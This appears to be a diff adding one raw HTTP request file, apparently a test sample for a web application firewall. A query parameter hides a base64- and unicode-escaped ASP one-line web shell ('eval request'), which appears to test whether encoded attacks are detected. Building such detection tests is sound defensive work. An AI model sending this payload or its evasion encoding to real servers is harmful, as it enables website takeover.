@@ -1,0 +1,13 @@
+GET /decouple/position/enabled?CLI=immutable&cluster=process&analogy=ClsgCiJcdTAwM0NcdTAwMjVcdTAwNjVcdTAwNzZcdTAwNjFcdTAwNkNcdTAwMjBcdTAwNzJcdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjVcdTAwNzNcdTAwNzRcdTAwMjhcdTAwMjJcdTAwNzNcdTAwNjJcdTAwMjJcdTAwMjlcdTAwMjVcdTAwM0UiCQpd HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36
+Cookie: dispatch=glossary; parenthesis=inter; tweak=homebrew; SESSIONID=0a2b94ec34147114988a6a73ae1e783f72a8d93f32d1b61a57300b7f198fe8ddd0405c23ddc98b71932a501f90b3160b
+
